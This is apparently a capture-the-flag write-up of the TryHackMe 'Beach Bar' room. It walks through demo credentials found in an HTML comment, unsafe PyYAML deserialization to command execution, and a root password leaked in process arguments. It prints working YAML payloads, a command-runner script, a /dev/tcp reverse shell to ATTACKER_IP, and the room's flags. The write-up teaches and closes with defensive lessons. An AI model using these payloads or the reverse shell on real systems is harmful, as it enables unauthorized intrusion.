---
title: "Beach Bar"
description: "A demo DJ login left in an HTML comment opens a Flask jukebox app. Its YAML import uses the unsafe PyYAML loader, giving command execution as bartender; a root service then leaks its password in ps and credential reuse finishes the box."
difficulty: "Easy"
tags: ["TryHackMe", "Hacker Holidays", "Boot2Root", "Web", "YAML Deserialization", "RCE", "Linux Privilege Escalation", "Credential Reuse"]
date: "2026-08-01"
---

## Overview

Beach Bar is the Day 5 boot2root room from TryHackMe's Hacker Holidays 2026 series. It chains four mistakes that are individually ordinary but devastating together: demo credentials left in an HTML comment, a YAML parser that can construct arbitrary Python objects, a root-owned service with its password in the process arguments, and reuse of that service password as the root login password.

The app is a small Flask jukebox served by Gunicorn. Users sign in as a DJ, view a dashboard, export a sample playlist, and import a playlist back. That export/import round trip is deliberate: the exported file is YAML, and the import endpoint deserializes it with `yaml.load(..., Loader=yaml.Loader)`. PyYAML's full loader honours Python-specific tags such as `!!python/object/apply`, so a playlist can ask the parser to call a Python function. A harmless `id` probe returns the output of `id` in the page, confirming remote code execution as the `bartender` user.

The final step is not a kernel exploit. A root process exposes `--stream-pass SunsetSpritz2024!` in its command line, and that same string is the root account password. `su root` completes the box.

![Diagram of the Beach Bar attack chain](/assets/screenshots/beachbar/attack-chain.svg)

The local room folder contained only `nmap.txt`, `dir.txt`, and `playlist.yml`. There were no screenshots and no flag files. The target IP in the local scan was `10.48.146.240` at the time; TryHackMe reassigns IPs, so the commands below use `TARGET`. The nmap header records a scan started on 31 July 2026 at 23:18:13, and `playlist.yml` was written on 1 August at 00:02, which is the basis for the post date. The terminal screenshots come from the writeup credited in References; the two diagrams are original.

## Room Information

| Field | Value |
|-------|-------|
| Platform | TryHackMe — Hacker Holidays 2026, Day 5 |
| Room | Beach Bar |
| Difficulty | Easy |
| Category | Boot2Root / Pentesting |
| Target | `10.48.146.240` at scan time (instance-specific) |
| Open ports | 22, 80 |
| Services | OpenSSH 9.6p1, Gunicorn (Flask application) |
| App | Beach Bar DJ booth and YAML jukebox |
| Entry point | `dj` / `dj` from an HTML comment on `/login` |
| RCE sink | `yaml.load(content, Loader=yaml.Loader)` at `/import` |
| Foothold | `bartender` (uid 1001) |
| Privilege escalation | `--stream-pass` leaked in root's argv, reused as the root password |
| Flags | User and root |

## Enumeration

### Service Scan

The local scan was a standard version-and-script scan:

```bash
nmap -sV -sC -oN nmap.txt 10.48.146.240
```

```text
# Nmap 7.98 scan initiated Fri Jul 31 23:18:13 2026
Nmap scan report for 10.48.146.240
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 5c:f0:cc:b2:de:48:9c:cf:92:29:76:7b:dc:95:28:8b (ECDSA)
|_  256 7b:83:47:8f:59:04:2f:e1:b6:9f:1d:32:59:bb:05:80 (ED25519)
80/tcp open  http    Gunicorn
| http-title: Beach Bar // Sign in
|_Requested resource was /login
|_http-server-header: gunicorn
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only two doors are open. SSH is public-key-only in this room, so password guessing is a dead end. Port 80 identifies as Gunicorn, which strongly suggests a Python WSGI application, and the title shows that unauthenticated visitors are sent to `/login`. The whole application is therefore behind one login form — which makes the login page the first place to inspect.

### Content Discovery

The local `dir.txt` file records the result of a directory scan. With the terminal colour codes removed, the useful lines are:

```text
dashboard   (Status: 302) [Size: 199] [--> /login]
export      (Status: 302) [Size: 199] [--> /login]
import      (Status: 302) [Size: 199] [--> /login]
login       (Status: 200) [Size: 3522]
logout      (Status: 302) [Size: 199] [--> /login]
```

This small list is informative:

- `/login` is the only unauthenticated page.
- `/dashboard`, `/export`, and `/import` all redirect to `/login`, so they require a session.
- `/export` and `/import` are a matched pair, which is exactly the kind of round trip that often involves deserialization.

### The Sample Playlist

The local folder also contains `playlist.yml`:

```yaml
# Beach Bar jukebox playlist export
playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
    - artist: Men I Trust
      title: Show Me How
    - artist: Crumb
      title: Locket
```

This is the file the app exports from `/export`. It looks harmless, but the format tells us what the server expects on the way back in: YAML. Any endpoint that accepts user-controlled YAML should immediately raise the question of which parser is being used, because some YAML loaders can instantiate Python objects, not just read data.

## Initial Access — Credentials in the Page Source

Because authentication gates everything else, the next step is to read the login page source rather than attack the form blindly:

```bash
curl -s http://TARGET/login | grep -B2 -A4 '<!--'
```

The page contains a staff note:

```html
<h1>DJ booth sign-in</h1>
<!--
  staff note: the demo DJ login is still enabled for the soft opening.
  dj / dj  -- swap this before the season starts (ticket BAR-7)
-->
```

![HTML comment on the login page revealing the demo DJ credentials](/assets/screenshots/beachbar/login-comment.png)

HTML comments are not private. Browsers do not render them, but the server sends them in the response body, so `curl`, Burp, or View Source reveals them instantly. Jinja comments (`{# ... #}`) and other server-side comment syntaxes are stripped before rendering; ordinary HTML comments are not.

The credentials `dj` / `dj` come with a ticket number, which is a nice detail: somebody tracked the work to remove the demo account, but the deploy was not blocked on it.

Logging in with a cookie jar saves the session for later requests:

```bash
curl -s -c cookies.txt -X POST http://TARGET/login \
  -d 'username=dj&password=dj'
```

The response is a `302` redirect to `/dashboard`. The session cookie is a Flask `itsdangerous` cookie: its first segment base64-decodes to `{"user":"dj"}`. That confirms the framework before we even read the source.

![Authenticated DJ booth surface with dashboard, import, export, and logout links](/assets/screenshots/beachbar/app-surface.png)

The authenticated area has exactly the four routes discovered earlier. `/export` returns the YAML sample; `/import` has both a `playlist` textarea and a `playlist_file` upload field that accepts `.yml` and `.yaml` files.

## Exploitation — YAML Deserialization to RCE

### Why the Import Feature Is Dangerous

PyYAML supports language-specific tags. `!!python/object/apply:<callable>` tells a permissive loader to import a callable and call it with the supplied arguments. If an application passes untrusted YAML to such a loader, the document stops being data and becomes code.

![How the unsafe PyYAML loader turns a playlist tag into command execution](/assets/screenshots/beachbar/yaml-deserialization.svg)

The relevant loaders are:

| Loader | Honours `!!python/object/apply` | Safe for untrusted input |
|--------|----------------------------------|--------------------------|
| `yaml.safe_load()` / `SafeLoader` | No | Yes |
| `FullLoader` | No, blocked since PyYAML 5.3.1 | Mostly |
| `Loader` / `UnsafeLoader` | Yes | No |

This room explicitly uses the unsafe one. The fix is not to filter the string `!!python`; tags such as `!!python/object/new`, `!!python/name`, and others reach importable callables too. The fix is to use a parser that cannot do this in the first place.

### Confirming Command Execution

A harmless `id` probe is enough to prove the bug. The space after the tag is important; without it, PyYAML's tokeniser can throw a scanning error that looks like a filter rejection.

```bash
curl -s -b cookies.txt -X POST http://TARGET/import \
  --data-urlencode 'playlist=!!python/object/apply:subprocess.check_output [["id"]]'
```

```text
<h2>Loaded playlist</h2>
<pre>b'uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)\n'</pre>
```

![The import endpoint reflecting the output of id as the bartender user](/assets/screenshots/beachbar/rce-id.png)

`subprocess.check_output` is a good choice for a proof of concept because its return value is the command's stdout, which the app renders back to us. `os.system` also executes, but returns `0` for success and sends the real output to the server's stdout, so the page shows only `0`.

The application source confirms the cause:

```python
content = request.form.get("playlist", "")
if "playlist_file" in request.files:
    f = request.files["playlist_file"]
    content = f.read().decode("utf-8", "replace")
try:
    parsed = yaml.load(content, Loader=yaml.Loader)
    result = parsed
```

![The application source showing yaml.load with the full Loader](/assets/screenshots/beachbar/unsafe-loader-source.png)

Line 95 is the whole vulnerability: someone explicitly selected `yaml.Loader`. It works perfectly for legitimate playlists, so nothing ever failed in a way that would draw attention.

### A Repeatable Command Channel

Typing quoted YAML for every command is awkward. A small helper logs in, Base64-encodes the command to avoid YAML quoting problems, sends it through `check_output`, and extracts the `<pre>` block from the response:

```python
#!/usr/bin/env python3
import base64, html, re, sys
import requests

TARGET = "http://TARGET"

def run(cmd):
    s = requests.Session()
    s.post(f"{TARGET}/login", data={"username": "dj", "password": "dj"})
    b64 = base64.b64encode(cmd.encode()).decode()
    payload = (
        "!!python/object/apply:subprocess.check_output "
        f'[["bash","-c","echo {b64}|base64 -d|bash 2>&1"]]'
    )
    r = s.post(f"{TARGET}/import", data={"playlist": payload})
    out = re.search(r"<pre>(.*?)</pre>", r.text, re.S).group(1)
    return html.unescape(out).strip()[2:-1].replace("\\n", "\n")

print(run(" ".join(sys.argv[1:])))
```

```bash
python3 rce.py 'id; cat /home/bartender/user.txt'
```

The Base64 wrapper means pipes, semicolons, and quotes in the command do not have to survive YAML parsing. `2>&1` brings errors back into the response instead of leaving them in the server log.

An alternative is a real reverse shell with `subprocess.Popen`:

```yaml
!!python/object/apply:subprocess.Popen
args:
  - ["bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"]
```

Start a listener with `nc -lvnp 4444` first. Both methods land as `bartender`, so choose whichever is more convenient: reflected output for quick enumeration, or an interactive shell for longer sessions.

The user flag is in the service account's home directory:

```bash
cat /home/bartender/user.txt
```

![The user flag read from the bartender home directory](/assets/screenshots/beachbar/user-flag.png)

```text
THM{y4ml_pl4yl1st_pwns_th3_b34ch}
```

## Privilege Escalation — A Password in Root's Command Line

The web application runs as the unprivileged `bartender` user, which is good practice and the reason RCE did not immediately mean root. `sudo -l` offers no usable path, SUID binaries and cron jobs are dead ends, and SSH is public-key-only.

Before reaching for more exotic techniques, inspect the process list:

```bash
ps auxww | grep -i jukebox | grep -v grep
```

The `ww` flag prevents `ps` from truncating long command lines to the terminal width. The interesting argument is often the one that gets cut off.

![Process list showing root jukeboxd with a stream-pass argument](/assets/screenshots/beachbar/ps-stream-pass.png)

```text
root 608 ... /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py
             --stream-pass SunsetSpritz2024! --bitrate 320k
```

Two problems appear in one line. First, a root-owned service receives a real password as a command-line argument. Linux exposes every process's arguments through `/proc/<pid>/cmdline`, which is world-readable by design so that `ps`, `top`, and monitoring agents can work. A secret passed as an argument is visible to every local user for the whole lifetime of the process.

Second, that "stream pass" is reused as the actual root password. Credential reuse turns an information leak into an authentication bypass:

```bash
echo 'SunsetSpritz2024!' | su -c 'id; cat /root/root.txt' root
```

Some systems require a TTY before `su` will read a piped password; in that case, use `python3 -c 'import pty; pty.spawn("/bin/bash")'` or a small PTY wrapper first. The cheap version works on this box.

![su with the reused password and the root flag](/assets/screenshots/beachbar/root-flag.png)

```text
uid=0(root) gid=0(root) groups=0(root)
THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
```

## Flags

The local room folder did not include flag files, so both values below are corroborated by three independent published writeups.

| Flag | Location | Value |
|------|----------|-------|
| User | `/home/bartender/user.txt` | `THM{y4ml_pl4yl1st_pwns_th3_b34ch}` |
| Root | `/root/root.txt` | `THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}` |

## Commands Used

| Command | Purpose |
|---------|---------|
| `nmap -sV -sC -oN nmap.txt TARGET` | Identify SSH and the Gunicorn web application |
| `curl -s http://TARGET/login \| grep -B2 -A4 '<!--'` | Read the HTML comment containing demo credentials |
| `curl -s -c cookies.txt -X POST http://TARGET/login -d 'username=dj&password=dj'` | Authenticate and save the Flask session cookie |
| `curl -b cookies.txt http://TARGET/export` | Retrieve the sample YAML playlist |
| `curl -s -b cookies.txt -X POST http://TARGET/import --data-urlencode 'playlist=!!python/object/apply:subprocess.check_output [["id"]]'` | Prove unsafe YAML deserialization and RCE |
| `python3 rce.py 'id; cat /home/bartender/user.txt'` | Run repeatable commands through the YAML channel and read the user flag |
| `ps auxww \| grep -i jukebox \| grep -v grep` | Find root's `--stream-pass` argument without truncation |
| `echo 'SunsetSpritz2024!' \| su -c 'id; cat /root/root.txt' root` | Reuse the leaked password to become root and read the root flag |

## Lessons Learned

**Read the page source before attacking the form.** The first door was not a brute-force problem; it was a comment that the developer never expected anyone to read. Anything in server-rendered HTML is public, including comments.

**Export/import round trips are deserialization sinks.** When an app exports a structured file and imports it back, the parser on the way in matters. YAML, pickle, PHP `unserialize`, Java `ObjectInputStream`, and Ruby `Marshal.load` all have histories of unsafe object construction.

**`yaml.load` and `yaml.safe_load` are not interchangeable.** The full `Loader` honours Python object tags. Modern PyYAML warns about loaderless `load`, but this app explicitly opted back into the unsafe behaviour. Use `safe_load` for user input, or a restricted `SafeLoader` subclass if custom tags are genuinely required.

**`check_output` makes a better reflected probe than `os.system`.** Its return value is the command's stdout, so the app renders the result. `os.system` returns only an exit status. This small detail made the vulnerability obvious in one request.

**Base64-wrapping commands avoids quoting hell.** Once a parser gives you command execution, encoding the command and decoding it in a shell keeps pipes, redirects, and quotes from being mangled by the outer YAML or form encoding.

**Process arguments are not secrets.** `ps auxww` and `/proc/<pid>/cmdline` are readable by ordinary users. Secrets belong in restricted files, environment variables sourced from a secrets manager, or a proper secret store — never in argv.

**`ww` matters.** Plain `ps aux` truncates command lines. The password in this room was in the part that a narrow terminal would cut off.

**Credential reuse connects small bugs into a big one.** The demo account, unsafe parser, and leaked service password were each contained. Reusing the stream password as root's login password is what turned a `bartender` shell into a full compromise.

**Check `ps` early on every Linux box.** It is cheap, quiet, and frequently more productive than hunting for SUID binaries. This room is a memorable demonstration of why.

## References

- [TryHackMe — Beach Bar (Hacker Holidays 2026, Day 5)](https://tryhackme.com/room/hh-beachbar-d849f7f7)
- [TryHackMe — Hacker Holidays](https://tryhackme.com/hackerholidays)
- [Animesh Roy — TryHackMe Beach Bar: A Playlist That Runs Commands](https://classroom.anir0y.in/post/thm-room-beach-bar/) — source of all terminal screenshots in this post
- [Kevinovitz — Hh beachbar d849f7f7](https://kevinovitz.github.io/TryHackMe_Writeups/hh-beachbar-d849f7f7/hh-beachbar-d849f7f7/)
- [Musyoka Ian — Byte Lotus: Beach Bar TryHackMe Writeup](https://musyokaian.medium.com/byte-lotus-beach-bar-tryhackme-writeup-e0f1a994231e)
- [Nanashi Bx2 — Hacker Holidays 2026, Day 5: Beach Bar](https://infosecwriteups.com/tryhackme-beach-bar-day-05-writeup-86beb05cd3d4)
- [Lorenzo Regalado — TryHackMe Hacker Holidays Walkthrough](https://hackernoon.com/tryhackme-hacker-hollidays-walkthrough)
- [PyYAML — Documentation](https://pyyaml.org/wiki/PyYAMLDocumentation)
- [OWASP — Deserialization](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)
